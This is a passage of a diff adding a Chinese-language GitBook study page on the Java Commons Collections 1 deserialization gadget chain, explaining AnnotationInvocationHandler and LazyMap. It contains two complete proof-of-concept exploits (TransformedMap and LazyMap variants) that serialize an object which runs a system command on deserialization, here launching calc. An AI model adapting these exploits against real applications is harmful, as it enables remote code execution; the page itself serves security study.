+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;toString&quot;</span>))
+            <span class="hljs-keyword">return</span> toStringImpl();
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;hashCode&quot;</span>))
+            <span class="hljs-keyword">return</span> hashCodeImpl();
+        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;annotationType&quot;</span>))
+            <span class="hljs-keyword">return</span> type;
+
+        <span class="hljs-comment">// Handle annotation member accessors</span>
+        Object result = memberValues.get(member); <span class="hljs-comment">// 触发点所在位置，将 memberValues 为 LazyMap</span>
+
+        <span class="hljs-keyword">if</span> (result == <span class="hljs-keyword">null</span>)
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IncompleteAnnotationException(type, member);
+
+        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)
+            <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();
+
+        <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)
+            result = cloneArray(result);
+
+        <span class="hljs-keyword">return</span> result;
+    }
+</code></pre>
+<p>yso 中的 cc1 链就是利用 AnnotationInvocationHandler.invoke() 方法可以调用到 LazyMap 的 get() 方法【动态代理】。这个 get 方法中调用了 transform 方法，只要我们<strong>将 this.factory 设置为 ChainedTransformer</strong> ，然后看看 <code>AnnotationInvocationHandler.invoke()</code> 所以让其 memberValues 为 LazyMap 即可。</p>
+<p>可以看看反序列化时都是些什么参数~【ConstantTransformer 是真的牛】</p>
+<p><img src="assets/image-20221008181441-73af1t8.png" alt="image">​</p>
+<p><img src="assets/image-20221008181437-h1y671l.png" alt="image">​</p>
+<h1 id="poc--exp"><a name="poc--exp" class="anchor-navigation-ex-anchor" href="#poc--exp"><i class="fa fa-link" aria-hidden="true"></i></a>POC &amp; EXP</h1>
+<p><img src="assets/image-20221009134927-ydd9dyh.png" alt="image">​</p>
+<h2 id="transformedmap"><a name="transformedmap" class="anchor-navigation-ex-anchor" href="#transformedmap"><i class="fa fa-link" aria-hidden="true"></i></a>TransformedMap</h2>
+<pre><code class="lang-java"><span class="hljs-keyword">package</span> zha0cai;
+
+<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;
+
+<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
+<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.lang.annotation.Target;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+
+        <span class="hljs-comment">// 通过构造函数初始化值</span>
+        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
+            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>})
+        };
+        <span class="hljs-comment">// 用于遍历触发对应的 transform 方法，控制数组第一个参数即可</span>
+        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+
+        <span class="hljs-comment">// 被装饰的非空 map，Since:HashMap, TreeMap, Hashtable...</span>
+        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();
+        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;zhaocai&quot;</span>);
+
+        <span class="hljs-comment">// 装饰，修改 valueTransformer 的值，用于调用对应类的 transform 方法</span>
+        Map transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-keyword">null</span>, chainedTransformer);
+
+        <span class="hljs-comment">// 反序列化触发类</span>
+        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(<span class="hljs-keyword">true</span>);
+        Object annoInvHdlObj = constructor.newInstance(Target.class, transformedMap);
+
+        <span class="hljs-comment">// 序列化</span>
+        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);
+        oos.writeObject(annoInvHdlObj);
+        oos.flush();
+        oos.close();
+
+        <span class="hljs-comment">// 反序列化</span>
+        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);
+        Object obj = (Object) ois.readObject();
+
+    }
+}
+</code></pre>
+<h2 id="lazymap"><a name="lazymap" class="anchor-navigation-ex-anchor" href="#lazymap"><i class="fa fa-link" aria-hidden="true"></i></a>LazyMap</h2>
+<pre><code class="lang-java"><span class="hljs-keyword">package</span> zha0cai;
+
+<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;
+
+<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
+<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
+<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
+<span class="hljs-keyword">import</span> java.lang.annotation.Target;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;
+<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Map;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+
+        <span class="hljs-comment">// 通过构造函数初始化值</span>
+        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
+            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] {String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[] {<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>}),
+            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc&quot;</span>})
+        };
+        <span class="hljs-comment">// 用于遍历触发对应的 transform 方法，控制数组第一个参数即可</span>
+        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);
+
+        <span class="hljs-comment">// 被装饰的 map，Since:HashMap, TreeMap, Hashtable...</span>
+        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();
+        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;dddd&quot;</span>);
+
+        <span class="hljs-comment">// 装饰，修改 factory 的值，用于调用对应类的 transform 方法</span>
+        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
+
+        <span class="hljs-comment">// 反序列化触发类</span>
+        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(<span class="hljs-keyword">true</span>);
+        <span class="hljs-comment">// 通过动态代理创建对象</span>
+        <span class="hljs-comment">//Object annoInvHdlObj = constructor.newInstance(Target.class, transformedMap);</span>
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]{Map.class}, handler);
+
+        handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);
+
+        <span class="hljs-comment">// 序列化</span>
+        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);
+        oos.writeObject(handler);
+        oos.close();
+
+        System.out.println(baos);
+
+        <span class="hljs-comment">// 反序列化</span>
+        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);
+        Object obj = (Object) ois.readObject();
+
+        <span class="hljs-comment">// 序列化、反序列化</span>
+<span class="hljs-comment">//        Serializer.serialized(handler, &quot;/src/test/resources/cc1.ser&quot;);</span>
+<span class="hljs-comment">//        Deserializer.deserialized(&quot;/src/test/resources/cc1.ser&quot;);</span>
+
+    }
+}
+</code></pre>
+<p><img src="assets/image-20221008155845-g6cgrf7.png" alt="image"></p>
+<blockquote>
+<p>代理后的对象叫做 proxyMap，但我们不能直接对其进行序列化，因为我们入口点是<br><code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>，所以我们还需要再用<br>AnnotationInvocationHandler 对这个 proxyMap 进行包裹。</p>
+</blockquote>
+<p><img src="assets/image-20221008162626-48hoxtc.png" alt="image">​</p>
+<p>如调试的时候还没反序列化就弹出了计算器，可以把下面这个选项取消掉。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/lkforce/article/details/90479650" target="_blank">关于 IDEA 在 debug 时私自调用 toString()方法的问题_lkforce 的博客-CSDN 博客</a></p>
+<ol>
+<li>IDEA 在 debug 时，当 debug 到某个对象时，会调用对象的 toString()方法，用来在 debug 界面显示对象信息。</li>
+<li>IDEA 调用 toString() 方法时，即使在 toString() 方法中设置了断点，该断点也不会被触发，也就是说，开发者多数情况下不会知道 toString() 方法被调用了。</li>
+<li>多数情况下调用一下 toString() 方法没有什么问题，但是也有例外，比如重写了 toString() 方法的类，随意的调用 toString() 方法会导致未知的问题。</li>
+<li>比如 Dubbo 的 AbstractConfig 类，对这个类的 debug 会导致其子类 ReferenceConfig 的 initialized 属性错误的被修改为 true，进而无法正确的生成 Dubbo 代理。<br></li>
+</ol>
+</blockquote>
+<p><img src="assets/image-20221008234131-roqi87u.png" alt="image">​</p>
+<h1 id="前人栽树"><a name="前人栽树" class="anchor-navigation-ex-anchor" href="#前人栽树"><i class="fa fa-link" aria-hidden="true"></i></a>前人栽树</h1>
+<ul>
+<li><a href="https://t.zsxq.com/05b2ZrFyB" target="_blank">伟大的 Java 安全漫谈 - 09 ~ 11</a></li>
+<li><a href="https://security.tencent.com/blog/msg/97" target="_blank">Commons Collections Java 反序列化漏洞深入分析 - 博客 - 腾讯安全应急响应中心 (tencent.com)</a></li>
+<li><a href="https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=9ca15b53bc13c823ac9d950a992e3561" target="_blank">白日梦组长</a></li>
+<li><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/" target="_blank">Apache Commons Collections 包和简介 | 闪烁之狐 (blinkfox.github.io)</a></li>
+<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability. (foxglovesecurity.com)</a></li>
+<li><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478" target="_blank">https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</a></li>
+</ul>
+<p>‍</p>
+<footer class="page-footer"><span class="copyright">Copyright &amp; Copy zha0cai all right reserved，powered by Gitbook</span><span class="footer-modification">该文件修订时间：
+2022-10-09 13:55:41
+</span></footer></body></html>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Java 安全漫谈 09 ~ 11.CommonsCollections1","level":"2.1.1","depth":2,"previous":{"title":"利用链学习","level":"2.1","depth":1,"ref":"","articles":[{"title":"Java 安全漫谈 09 ~ 11.CommonsCollections1","level":"2.1.1","depth":2,"path":"反序列化/Java 安全漫谈 - 09 ~ 11.CommonsCollections1.md","ref":"反序列化/Java 安全漫谈 - 09 ~ 11.CommonsCollections1.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-pro","highlight","code","theme-comscore","-splitter","-summary","anchor-navigation-ex","expandable-chapters","versions-select","tbfed-pagefooter","flexible-alerts","advanced-emoji"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright & Copy zha0cai","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"search-pro":{},"code":{"copyButtons":true},"versions-select":{"type":"branches"},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"showLevel":false,"associatedWithSummary":true,"mode":"float","showGoTop":true,"printLog":false,"multipleH1":true,"float":{"floatIcon":"fa fa-navicon","showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""},"pageTop":{"showLevelIcon":false,"level1Icon":"","level2Icon":"","level3Icon":""}},"theme-comscore":{},"flexible-alerts":{"style":"callout","note":{"label":"Hinweis","icon":"fa fa-info-circle","className":"info"},"tip":{"label":"Tipp","icon":"fa fa-lightbulb-o","className":"tip"},"warning":{"label":"Warnung","icon":"fa fa-exclamation-triangle","className":"warning"},"danger":{"label":"Achtung","icon":"fa fa-ban","className":"danger"}},"versions":{"gitbookConfigURL":"book.json","options":[{"value":"https://zha0cai.github.io/gitbookPublic/gitbook-javasec/","text":"JavaSec","selected":true},{"value":"https://zha0cai.github.io/gitbookPublic/home/","text":"Home Page","selected":true}]},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"chart":{"type":"c3"},"expandable-chapters":{}},"theme":"default","author":"zha0cai","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Java Sec","language":"zh-hans","links":{"sidebar":{"My github":"https://github.com/zha0cai"}},"gitbook":"*"},"file":{"path":"反序列化/Java 安全漫谈 - 09 ~ 11.CommonsCollections1.md","mtime":"2022-10-09T05:55:41.758Z","type":"markdown"},"gitbook":{"version":"4.0.0","time":"2022-10-09T06:22:25.981Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <noscript>
+        <style>
+            .honkit-cloak {
+                display: block !important;
+            }
+        </style>
+    </noscript>
+    <script>
+        // Restore sidebar state as critical path for prevent layout shift
+        function __init__getSidebarState(defaultValue){
+            var baseKey = "";
+            var key = baseKey + ":sidebar";
+            try {
+                var value = localStorage[key];
+                if (value === undefined) {
+                    return defaultValue;
+                }
+                var parsed = JSON.parse(value);
+                return parsed == null ? defaultValue : parsed;
+            } catch (e) {
+                return defaultValue;
+            }
+        }
+        function __init__restoreLastSidebarState() {
+            var isMobile = window.matchMedia("(max-width: 600px)").matches;
+            if (isMobile) {
+                // Init last state if not mobile
+                return;
+            }
+            var sidebarState = __init__getSidebarState(true);
+            var book = document.querySelector(".book");
+            // Show sidebar if it enabled
+            if (sidebarState && book) {
+                book.classList.add("without-animation", "with-summary");
+            }
+        }
+
+        try {
+            __init__restoreLastSidebarState();
+        } finally {
+            var book = document.querySelector(".book");
+            book.classList.remove("honkit-cloak");
+        }
+    </script>
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-versions-select/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
